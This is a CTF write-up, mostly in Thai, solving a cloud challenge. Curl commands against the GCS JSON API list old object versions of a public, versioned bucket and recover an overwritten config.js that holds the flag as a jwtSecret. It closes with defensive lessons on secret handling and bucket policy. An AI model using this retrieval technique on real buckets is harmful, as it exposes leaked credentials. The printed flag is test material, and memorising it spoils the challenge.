# CLOUD 🍰 Ghost in the Bucket (Misc)

**Platform:** STDiO CTF 2025

## Description

> A junior developer ran a deployment script to a GCP bucket hosting a static website. On their first deployment, they accidentally pushed sensitive files. They immediately deployed a new version with all sensitive files removed. Is everything OK?

**URL:** `https://ghost-in-the-bucket.storage.googleapis.com/`
## Solution

### Step 1: สำรวจเว็บไซต์เบื้องต้น

เปิด URL ที่โจทย์ให้มา พบว่าเป็นเว็บไซต์ Static ธรรมดาที่ Host อยู่บน GCS Bucket

ลองตรวจสอบว่ามี `.git` directory หรือไม่ (เผื่อมี Git source exposure):

```bash
$ curl -s https://ghost-in-the-bucket.storage.googleapis.com/.git/HEAD
```

ผลลัพธ์เป็น Error `NoSuchKey` — ไม่มี `.git` directory ดังนั้นจึงไม่ใช่แนว Git Exposure

---

### Step 2: ตรวจสอบ HTTP Headers

ใช้ `curl -I` เพื่อดู HTTP Response Headers เพื่อหาข้อมูลเพิ่มเติม:

```bash
$ curl -I https://ghost-in-the-bucket.storage.googleapis.com/
```

```
HTTP/2 200
content-type: application/xml; charset=UTF-8
x-goog-metageneration: 5
```

**จุดสังเกต:** Header `x-goog-metageneration: 5` บ่งบอกว่า Bucket นี้ใช้ **GCS Versioning** และมีการอัปเดต Metadata มาแล้ว 5 ครั้ง

```bash
$ curl -I https://ghost-in-the-bucket.storage.googleapis.com/index.html
```

```
HTTP/2 200
x-goog-generation: 1762357272476696
x-goog-metageneration: 1
content-type: text/html
content-length: 625
```

**จุดสังเกต:** Header `x-goog-generation` แสดง **Generation ID** ของไฟล์ ซึ่งเป็น Timestamp ที่ GCS ใช้ระบุเวอร์ชันของ Object แต่ละตัว

---

### Step 3: ดูรายชื่อไฟล์ทั้งหมดใน Bucket

เนื่องจาก Bucket เปิด Public Access อยู่ เราสามารถ List ไฟล์ทั้งหมดได้โดยเปิด URL ของ Bucket ตรงๆ:

```xml
<ListBucketResult>
  <Name>ghost-in-the-bucket</Name>
  <Contents>
    <Key>404.html</Key>
    <Generation>1762578815878180</Generation>
  </Contents>
  <Contents>
    <Key>config.js</Key>
    <Generation>1762578815928633</Generation>
  </Contents>
  <Contents>
    <Key>index.html</Key>
    <Generation>1762578815884901</Generation>
  </Contents>
  <Contents>
    <Key>styles.css</Key>
    <Generation>1762578815932452</Generation>
  </Contents>
</ListBucketResult>
```

ไฟล์ปัจจุบันมี 4 ไฟล์: `404.html`, `config.js`, `index.html`, `styles.css` — ดูปกติไม่มีอะไรน่าสงสัย

---

### Step 4: ค้นหาเวอร์ชันเก่าของไฟล์ (Object Versioning)

จาก Description ที่บอกว่า Developer **"deployed a new version with all sensitive files removed"** นั่นหมายความว่า **เวอร์ชันเก่ายังอาจอยู่** ถ้า Bucket เปิด Versioning

ใช้ GCS JSON API เพื่อ List ไฟล์ทุกเวอร์ชัน (ทั้งเก่าและใหม่):

```bash
$ curl "https://www.googleapis.com/storage/v1/b/ghost-in-the-bucket/o?versions=true&fields=items(name,generation)"
```

```json
{
  "items": [
    { "name": "404.html",   "generation": "1762578815878180" },
    { "name": "config.js",  "generation": "1762578809508193" },
    { "name": "config.js",  "generation": "1762578815928633" },
    { "name": "index.html", "generation": "1762578809513421" },
    { "name": "index.html", "generation": "1762578815884901" },
    { "name": "styles.css", "generation": "1762578815932452" }
  ]
}
```

**จุดสำคัญ!** สังเกตว่า `config.js` และ `index.html` มี **2 เวอร์ชัน** (2 Generation IDs):

| ไฟล์ | Generation (เก่า) | Generation (ใหม่) |
|------|-------------------|-------------------|
| `config.js` | `1762578809508193` | `1762578815928633` |
| `index.html` | `1762578809513421` | `1762578815884901` |

Generation ที่เลข **น้อยกว่า** คืออัปโหลดก่อน = เวอร์ชันเก่าที่ Developer อัปโหลดผิดพลาด!

---

### Step 5: ดาวน์โหลดเวอร์ชันเก่าของไฟล์

ดึงเวอร์ชันเก่าของ `config.js` และ `index.html` โดยใช้ `?generation=` parameter:

```bash
# ดึง config.js เวอร์ชันเก่า
$ curl "https://storage.googleapis.com/ghost-in-the-bucket/config.js?generation=1762578809508193" -o config.old.js

# ดึง index.html เวอร์ชันเก่า
$ curl "https://storage.googleapis.com/ghost-in-the-bucket/index.html?generation=1762578809513421" -o index.old.html
```

---

### Step 6: ค้นหา Flag ในไฟล์เวอร์ชันเก่า

ใช้ `grep` ค้นหา Flag ในไฟล์ที่ดาวน์โหลดมา:

```bash
$ grep -nE "STDIO2025_|FLAG\{|flag\{" config.old.js index.old.html
```

```
config.old.js:4:    jwtSecret: "STDIO2025_35{833fb6d5371ee0c0eb46bcdee4a6f2be}",
```

**พบ Flag!** ใน `config.js` เวอร์ชันเก่า ที่ Developer เผลอ Push ขึ้นไปในครั้งแรก — ถูกเก็บเป็น `jwtSecret` อยู่ใน Config ของเว็บ

## Flag

```
STDIO2025_35{833fb6d5371ee0c0eb46bcdee4a6f2be}
```

## Summary

โจทย์ข้อนี้ทำให้ได้เรียนรู้เกี่ยวกับช่องโหว่ของ **Google Cloud Storage (GCS) Object Versioning** — เมื่อ Bucket เปิดใช้งาน Versioning ไฟล์ที่ถูก "ลบ" หรือ "อัปโหลดทับ" จะ **ไม่ได้หายไปจริง** เวอร์ชันเก่ายังคงอยู่และสามารถเข้าถึงได้ด้วย `?generation=<ID>` อีกทั้ง GCS JSON API (`?versions=true`) ยังสามารถ List เวอร์ชันทั้งหมดได้ถ้า Bucket เป็น Public

**บทเรียนด้าน Security:**
- **ห้ามเก็บ Secret ใน Static Files** — ข้อมูลเช่น JWT Secret, API Key, หรือ Password ไม่ควรอยู่ใน Client-side Code
- **Versioning ≠ Deletion** — การอัปโหลดไฟล์ใหม่ทับไม่ได้ลบเวอร์ชันเก่า ต้องลบ Object Generation โดยเฉพาะเจาะจง
- **ต้อง Rotate Secrets ทันที** — หาก Secret ถูก Expose แม้จะลบออกแล้ว ต้อง Rotate (สร้างใหม่) ทันที เพราะของเก่าอาจถูกดึงออกไปแล้ว
- **ตั้งค่า Bucket Policy ให้เหมาะสม** — ไม่ควรเปิด Public Access ให้ List ไฟล์ได้ และควรตั้ง Lifecycle Rules เพื่อลบ Non-current Versions อัตโนมัติ
